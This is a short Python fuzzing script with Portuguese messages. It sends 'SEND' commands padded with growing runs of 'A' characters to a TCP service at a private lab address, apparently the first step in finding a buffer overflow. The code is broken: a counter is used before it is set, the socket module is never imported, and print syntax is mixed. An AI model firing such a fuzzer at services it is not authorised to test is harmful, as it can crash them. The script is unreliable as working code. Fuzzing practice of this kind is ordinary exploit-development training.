#!/usr/bin/python

lista = ["A"]
print (type(lista))

while len(lista) <= 3:
	lista.append("A"*contador)
	contador = contador + 100

for dados in lista:
	print "Fuzzing com SEND %s bytes" %len(dados)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.5", 5800))
	s.recv(1024)
	s.send("SEND "+dados+"\r\n")
